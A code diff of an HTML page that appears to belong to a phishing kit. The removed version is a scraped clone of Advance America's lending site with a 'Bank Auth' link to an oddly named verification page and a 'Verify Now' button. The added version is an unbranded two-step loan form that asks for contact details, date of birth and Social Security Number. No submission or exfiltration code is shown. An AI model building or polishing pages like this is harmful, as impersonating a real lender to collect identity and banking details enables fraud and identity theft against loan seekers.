@@ -1,175 +1,237 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <title>Personal Loan Application</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>Advance America - Personal Loans with Fast Approval</title>
-  <meta name="description" content="Get a personal loan up to $100,000 with competitive rates, no fees, and fast funding. Apply online in minutes with Advance America.">
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: #f5f7fb;
+      margin: 0;
+      padding: 40px 0;
+    }
 
-  <!-- KEEP ONLY CSS (NO NEXT.JS JS) -->
-  <link rel="stylesheet" href="_next/static/css/7e7d96b1e6991756.css">
-  <link rel="stylesheet" href="_next/static/css/e0bf5c09e3b3489a.css">
+    .card {
+      max-width: 600px;
+      margin: auto;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.12);
+      overflow: hidden;
+    }
+
+    .header {
+      padding: 24px;
+      border-bottom: 1px solid #e5e7eb;
+      text-align: center;
+    }
+
+    .header h1 {
+      margin: 0 0 8px;
+      font-size: 26px;
+    }
+
+    .progress {
+      display: flex;
+      justify-content: space-between;
+      font-size: 14px;
+      color: #6b7280;
+      margin-bottom: 8px;
+    }
+
+    .bar {
+      height: 8px;
+      background: #fde68a;
+      border-radius: 999px;
+    }
+
+    .bar.full { width: 100%; }
+    .bar.half { width: 50%; }
+
+    .content {
+      padding: 24px;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #374151;
+    }
+
+    input, select {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      border-radius: 8px;
+      border: 1px solid #d1d5db;
+      font-size: 15px;
+      margin-bottom: 16px;
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    .grid-3 {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 12px;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 24px;
+    }
+
+    button {
+      height: 44px;
+      padding: 0 24px;
+      border-radius: 8px;
+      border: none;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn-primary {
+      background: #2563eb;
+      color: white;
+    }
+
+    .btn-primary:hover {
+      background: #1d4ed8;
+    }
+
+    .btn-success {
+      background: #16a34a;
+      color: white;
+    }
+
+    .btn-success:hover {
+      background: #15803d;
+    }
+
+    .btn-outline {
+      background: transparent;
+      border: 2px solid #d1d5db;
+    }
+  </style>
 </head>
 
-<body class="__className_f367f3">
+<body>
 
-<div class="min-h-screen bg-white">
+<div class="card">
 
-  <!-- HEADER -->
-  <header class="bg-white shadow-sm border-b">
-    <div class="container mx-auto px-4">
-      <div class="flex items-center justify-between h-16">
+  <!-- STEP 1 -->
+  <div id="step1">
+    <div class="header">
+      <h1>Personal Loan Application</h1>
+      <div class="progress">
+        <span>Step 1 of 2</span>
+        <span>50% Complete</span>
+      </div>
+      <div class="bar half"></div>
+    </div>
 
-        <a class="flex items-center" href="index.html">
-          <img src="images/advance-america-logo.png" alt="Advance America" width="180" height="40">
-        </a>
+    <div class="content">
+      <label>Loan Amount *</label>
+      <input type="number" min="2000" max="10000" value="5000">
 
-        <nav class="hidden md:flex items-center space-x-8">
-          <a class="text-gray-700 hover:text-blue-600 font-medium" href="personal-loans.html">Personal Loans</a>
-          <a class="text-gray-700 hover:text-blue-600 font-medium" href="how-it-works.html">How It Works</a>
-          <a class="text-gray-700 hover:text-blue-600 font-medium" href="vrfy6134853.html">Bank Auth</a>
-          <a class="text-gray-700 hover:text-blue-600 font-medium" href="faqs.html">FAQs</a>
-          <a class="text-gray-700 hover:text-blue-600 font-medium" href="contact.html">Contact</a>
-          <a class="text-gray-700 hover:text-blue-600 font-medium" href="ppi.html">PPI Info</a>
-        </nav>
+      <label>Loan Purpose *</label>
+      <select>
+        <option value="">Select purpose</option>
+        <option>Debt Consolidation</option>
+        <option>Home Improvement</option>
+        <option>Medical Expenses</option>
+        <option>Personal Expenses</option>
+      </select>
 
-        <div class="hidden md:flex items-center space-x-4">
-          <a href="login.html">
-            <button class="h-10 px-4 border border-blue-500 text-blue-500 rounded-md hover:bg-blue-50">
-              Login
-            </button>
-          </a>
-          <a href="index.html">
-            <button class="h-10 px-4 bg-blue-500 text-white rounded-md hover:bg-blue-600">
-              Apply Now
-            </button>
-          </a>
-        </div>
-
+      <div class="actions">
+        <span></span>
+        <button class="btn-primary" type="button" onclick="goToStep2()">Next</button>
       </div>
     </div>
-  </header>
+  </div>
 
-  <!-- HERO -->
-  <section class="bg-gradient-to-br from-blue-50 to-indigo-100 py-20">
-    <div class="container mx-auto px-4">
-      <div class="grid lg:grid-cols-2 gap-12 items-center">
+  <!-- STEP 2 -->
+  <div id="step2" style="display:none;">
+    <div class="header">
+      <h1>Personal Loan Application</h1>
+      <div class="progress">
+        <span>Step 2 of 2</span>
+        <span>100% Complete</span>
+      </div>
+      <div class="bar full"></div>
+    </div>
 
+    <div class="content">
+      <div class="grid-2">
         <div>
-          <div class="inline-flex items-center rounded-full bg-green-100 text-green-800 px-3 py-1 text-xs font-semibold mb-4">
-            No Hidden Fees • Fast Approval
-          </div>
-
-          <h1 class="text-4xl lg:text-6xl font-bold text-gray-900 mb-6">
-            Personal Loans Up to <span class="text-blue-600">$100,000</span>
-          </h1>
-
-          <p class="text-xl text-gray-600 mb-8">
-            Get the funds you need with competitive rates, no origination fees, and fast funding.
-          </p>
-
-          <div class="flex gap-4">
-            <a href="personal-loans.html">
-              <button class="h-11 px-8 bg-blue-600 text-white rounded-md hover:bg-blue-700">
-                Verify Now
-              </button>
-            </a>
-            <a href="how-it-works.html">
-              <button class="h-11 px-8 border rounded-md bg-white hover:bg-gray-100">
-                How It Works
-              </button>
-            </a>
-          </div>
+          <label>First Name *</label>
+          <input type="text" placeholder="John">
         </div>
-
-        <!-- FORM CARD (UI ONLY – STATIC) -->
-        <div class="rounded-lg border bg-white shadow-lg max-w-md mx-auto w-full">
-          <div class="p-6 bg-gray-50 border-b text-center text-2xl font-semibold">
-            Personal Loan Application
-          </div>
-
-          <div class="p-6 space-y-6">
-            <div>
-              <label class="block text-sm font-medium text-gray-700 mb-2">
-                Loan Amount ($2,000 to $10,000)
-              </label>
-              <input type="number" min="2000" max="10000" value="5000"
-                class="w-full h-12 border-2 border-gray-300 rounded-md px-4">
-            </div>
-
-            <div>
-              <label class="block text-sm font-medium text-gray-700 mb-2">
-                Loan Purpose
-              </label>
-              <select class="w-full h-12 border-2 border-gray-300 rounded-md px-4">
-                <option>Select loan purpose</option>
-                <option>Debt Consolidation</option>
-                <option>Home Improvement</option>
-                <option>Medical</option>
-                <option>Personal Expenses</option>
-              </select>
-            </div>
-
-            <a href="personal-loans.html">
-              <button class="w-full h-12 bg-blue-600 text-white rounded-md hover:bg-blue-700">
-                Next
-              </button>
-            </a>
-          </div>
+        <div>
+          <label>Last Name *</label>
+          <input type="text" placeholder="Doe">
         </div>
+      </div>
 
+      <div class="grid-2">
+        <div>
+          <label>Email ID *</label>
+          <input type="email">
+        </div>
+        <div>
+          <label>Phone Number *</label>
+          <input type="tel" placeholder="(555) 123-4567">
+        </div>
+      </div>
+
+      <label>Home Address *</label>
+      <input type="text" placeholder="123 Main Street">
+
+      <div class="grid-3">
+        <input type="text" placeholder="City">
+        <input type="text" placeholder="State">
+        <input type="text" placeholder="ZIP">
+      </div>
+
+      <label>Date of Birth *</label>
+      <div class="grid-3">
+        <input type="text" placeholder="Month">
+        <input type="text" placeholder="Day">
+        <input type="text" placeholder="Year">
+      </div>
+
+      <label>Social Security Number *</label>
+      <input type="text" placeholder="XXX-XX-XXXX">
+
+      <div class="actions">
+        <button class="btn-outline" type="button" onclick="goToStep1()">← Back</button>
+        <button class="btn-success" type="submit">Submit Application</button>
       </div>
     </div>
-  </section>
-
-  <!-- FOOTER -->
-  <footer class="bg-slate-900 text-white">
-    <div class="container mx-auto px-4 py-12 grid md:grid-cols-4 gap-8">
-
-      <div>
-        <img src="images/advance-america-logo.png" width="200" height="50" class="mb-4" alt="Advance America">
-        <p class="text-gray-400 text-sm">
-          America’s trusted online lending service with fast approvals.
-        </p>
-      </div>
-
-      <div>
-        <h3 class="font-semibold mb-4">Products</h3>
-        <ul class="space-y-2 text-sm text-gray-400">
-          <li><a href="personal-loans.html">Personal Loans</a></li>
-          <li><a href="debt-consolidation.html">Debt Consolidation</a></li>
-          <li><a href="home-improvement.html">Home Improvement</a></li>
-          <li><a href="auto-refinancing.html">Auto Refinancing</a></li>
-        </ul>
-      </div>
-
-      <div>
-        <h3 class="font-semibold mb-4">Company</h3>
-        <ul class="space-y-2 text-sm text-gray-400">
-          <li><a href="about.html">About Us</a></li>
-          <li><a href="how-it-works.html">How It Works</a></li>
-          <li><a href="contact.html">Contact</a></li>
-        </ul>
-      </div>
-
-      <div>
-        <h3 class="font-semibold mb-4">Support</h3>
-        <ul class="space-y-2 text-sm text-gray-400">
-          <li><a href="faqs.html">FAQs</a></li>
-          <li><a href="privacy-policy.html">Privacy Policy</a></li>
-          <li><a href="terms.html">Terms</a></li>
-        </ul>
-      </div>
-
-    </div>
-
-    <div class="border-t border-gray-800 text-center py-4 text-gray-400 text-sm">
-      © 2025 Advance America. All rights reserved.
-    </div>
-  </footer>
+  </div>
 
 </div>
+
+<script>
+  function goToStep2() {
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("step2").style.display = "block";
+  }
+
+  function goToStep1() {
+    document.getElementById("step2").style.display = "none";
+    document.getElementById("step1").style.display = "block";
+  }
+</script>
 
 </body>
 </html>
